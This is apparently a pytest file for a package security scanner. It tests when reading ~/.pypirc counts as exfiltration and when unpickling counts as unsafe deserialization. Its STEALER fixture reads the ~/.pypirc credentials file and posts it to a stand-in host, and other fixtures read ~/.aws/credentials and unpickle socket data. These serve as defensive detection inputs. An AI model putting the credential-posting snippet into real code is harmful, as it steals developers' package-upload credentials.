"""Package-index tooling reading its own upload configuration, and pickle round trips.

`pypi:pip` scored CRITICAL 90: its vendored distlib reads `~/.pypirc` (the PyPI upload config,
the file distlib's upload code exists to read) and pip uses urllib elsewhere, which synthesized
ST-COMBO-EXFIL. A package-index client reading the index's credentials is its documented function,
like botocore reading ~/.aws: an own-provider read. Only the registry name decides it, so any other
package that reads ~/.pypirc and has network egress still synthesizes the exfiltration combo.

Rich (vendored in pip) keeps a style's metadata as `self._meta = dumps(meta)` and reads it back
with `loads(self._meta)`: bytes the object serialized itself, not input from anywhere else.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal.engine import analyze_directory
from skilltotal.models import Component

DISTLIB = (
    "import os\n"
    "class PyPIRCFile(object):\n"
    "    def __init__(self, fn=None, url=None):\n"
    "        if fn is None:\n"
    "            fn = os.path.join(os.path.expanduser('~'), '.pypirc')\n"
    "        self.filename = fn\n"
)
NETWORK = "import urllib.request\n\ndef get(url):\n    return urllib.request.urlopen(url).read()\n"
STEALER = (
    "import os\nimport urllib.request\n\n"
    "def sync():\n"
    "    with open(os.path.join(os.path.expanduser('~'), '.pypirc')) as fh:\n"
    "        data = fh.read().encode()\n"
    "    urllib.request.urlopen('https://collect.example.invalid/u', data=data)\n"
)


def _scan(tmp_path: Path, files: dict[str, str], *, source: str, type_: str = "python_package"):
    for name, text in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="\n")
    return analyze_directory(tmp_path, Component(name="x", type=type_, source=source))


def _ids(report) -> set[str]:
    return {f.id for f in report.findings}


@pytest.mark.parametrize("source", ["pypi:pip==26.2.1", "pypi:twine", "pypi:distlib==0.4.0"])
def test_package_index_tooling_reading_pypirc_is_its_own_provider_read(tmp_path, source):
    report = _scan(tmp_path, {
        "pip/_vendor/distlib/util.py": DISTLIB,
        "pip/_internal/network/download.py": NETWORK,
    }, source=source)
    assert "ST-COMBO-EXFIL" not in _ids(report)
    assert "ST-SENS-PATH-PY" not in _ids(report)
    assert any("ST-SENS-PATH-PY" in n.reason for n in report.needs_review)
    assert report.risk_level.value not in ("high", "critical")


@pytest.mark.parametrize("source,type_", [
    ("pypi:pypirc-sync", "python_package"),
    ("pypi:pip-tools-helper", "python_package"),
    # A name a folder or repository gives itself is not the registry's: no allowance.
    ("https://github.com/example/pip", "git_repo"),
])
def test_any_other_package_reading_pypirc_and_posting_it_still_fires(tmp_path, source, type_):
    report = _scan(tmp_path, {"sync/core.py": STEALER}, source=source, type_=type_)
    assert "ST-COMBO-EXFIL" in _ids(report)
    assert "ST-SENS-PATH-PY" in _ids(report)


def test_pip_still_reports_another_providers_credentials(tmp_path):
    report = _scan(tmp_path, {
        "pip/_internal/x.py": "import os\nopen(os.path.expanduser('~/.aws/credentials'))\n",
        "pip/_internal/network/download.py": NETWORK,
    }, source="pypi:pip")
    assert "ST-COMBO-EXFIL" in _ids(report)


# --- pickle / marshal round trips of the object's own state ----------------------------------

RICH_STYLE = (
    "from pickle import dumps, loads\n"
    "class Style:\n"
    "    _meta: bytes | None\n"
    "    def __init__(self, meta=None):\n"
    "        self._meta = None if meta is None else dumps(meta)\n"
    "    @classmethod\n"
    "    def from_meta(cls, meta):\n"
    "        style = cls.__new__(cls)\n"
    "        style._meta = dumps(meta)\n"
    "        return style\n"
    "    def copy(self):\n"
    "        style = self.__new__(Style)\n"
    "        style._meta = self._meta\n"
    "        return style\n"
    "    def __add__(self, other):\n"
    "        new = self.copy()\n"
    "        new._meta = self._meta or other._meta\n"
    "        return new\n"
    "    @property\n"
    "    def meta(self):\n"
    "        return {} if self._meta is None else loads(self._meta)\n"
)


def test_unpickling_bytes_the_object_pickled_itself_is_not_unsafe(tmp_path):
    report = _scan(tmp_path, {"rich/style.py": RICH_STYLE}, source="local", type_="local")
    assert "ST-DESERIALIZE-PY" not in _ids(report)


@pytest.mark.parametrize("extra", [
    "def load(sock):\n    s = Style()\n    s._meta = sock.recv(4096)\n    return s.meta\n",
    "def load(path):\n    s = Style()\n    s._meta = open(path, 'rb').read()\n    return s.meta\n",
])
def test_an_attribute_filled_from_elsewhere_is_still_unsafe(tmp_path, extra):
    report = _scan(tmp_path, {"rich/style.py": RICH_STYLE + extra}, source="local", type_="local")
    assert "ST-DESERIALIZE-PY" in _ids(report)


def test_plain_unpickling_is_still_unsafe(tmp_path):
    source = "import pickle\n\ndef load(blob):\n    return pickle.loads(blob)\n"
    report = _scan(tmp_path, {"x.py": source}, source="local", type_="local")
    assert "ST-DESERIALIZE-PY" in _ids(report)
